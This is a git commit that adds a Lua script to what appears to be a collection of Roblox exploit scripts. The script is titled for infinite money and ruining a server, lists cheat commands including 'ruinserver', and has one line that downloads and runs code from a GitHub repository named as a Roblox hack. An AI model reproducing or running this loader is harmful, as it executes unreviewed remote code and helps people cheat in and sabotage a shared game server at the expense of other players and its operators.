415fbf171a82f5828a4cbfe823726bbb4efb9f32
Emil Toth <emiltoth1870@gmail.com>
2023-03-08 15:01:53 +0100

    Updated automatically!

---
+++ Scripts/Autoadd/Hotel Elephant Admin V Infinite Money Ruin Server.lua
@@ -0,0 +1,11 @@
+--[[
+Commands:
+========================
+money [Player] Amount
+========================
+ghost [Player]
+========================
+ruinserver
+========================
+]]--
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Teemsploit/Epic-roblox-hack/main/HotelElephantAdminV1"))()
